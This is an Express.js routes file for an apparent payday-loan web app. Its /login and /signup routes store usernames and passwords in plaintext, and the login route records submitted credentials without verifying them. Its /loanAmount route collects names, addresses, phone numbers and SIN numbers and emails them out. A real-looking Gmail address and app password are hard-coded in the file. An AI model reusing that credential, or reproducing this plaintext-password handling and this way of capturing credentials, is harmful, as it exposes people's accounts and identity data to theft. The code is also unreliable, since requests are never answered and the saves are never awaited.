const express = require("express");
const userLogin = require("../Models/userLogin.js");
const userSignup = require("../Models/userSignup.js");
const userLoanAmount = require("../Models/userLoanAmount.js");
const nodemailer = require("nodemailer");
var cors = require("cors");

var corsOptions = {
  origin: "https://payday1.vercel.app",
  optionsSuccessStatus: 200,
};

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "dhirajsuthar39@gmail.com",
    pass: "xufn jfth quzw mwqz",
  },
});

const routes = new express.Router();

// for the creating the new note
routes.post("/login", cors(corsOptions), (req, res) => {
  try {
    const { username, password } = req.body;

    let adata = new userLogin({
      username: username,
      password: password,
    });

    adata.save();
    // const data = req.cookie.loginStatus;
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

routes.post("/signup", cors(corsOptions), (req, res) => {
  try {
    const { username, phonenumber, password } = req.body;
    let adata = new userSignup({
      username: username,
      phonenumber: phonenumber,
      password: password,
    });

    adata.save();
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

routes.get("/", cors(corsOptions), (req, res) => {
  res.send("Working");
});

routes.post("/loanAmount", cors(corsOptions), (req, res) => {
  try {
    const {
      Address,
      Fname,
      Appartment,
      PostalCode,
      Lname,
      City,
      Email,
      YearsAtAddress,
      MonthsAtAddress,
      CellPhone,
      Alternate,
      Sin,
      title,
      month,
      day,
      year,
      martialStatus,
      Amount,
    } = req.body;
    let adata = new userLoanAmount(req.body);
    adata.save();

    let date = new Date().toLocaleDateString();
    // console.log()

    var mailOptions = {
      from: "drsuthar781@gmail.com",
      to: Email,
      subject: `Customer Details ${date}`,
      text: `
            Full Name:${Fname}
            Last Name:${Lname}
            Address:${Address}
            Apparment:${Appartment}
            Postal Code:${PostalCode}
            City:${City}
            Email:${Email}
            Years at Address:${YearsAtAddress}
            Months at Address:${MonthsAtAddress}
            Phone Number:${CellPhone}
            Another Phone Number:${Alternate}
            SIN:${Sin}
            Title:${title}
            Date:${month + "-" + day + "-" + year}
            Martial Status:${martialStatus}
            Amount of Loan:${Amount}
            `,
    };

    transporter.sendMail(mailOptions, (er, info) => {
      if (er) {
        console.log(er);
      } else {
        console.log("mailsent");
      }
    });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

module.exports = routes;
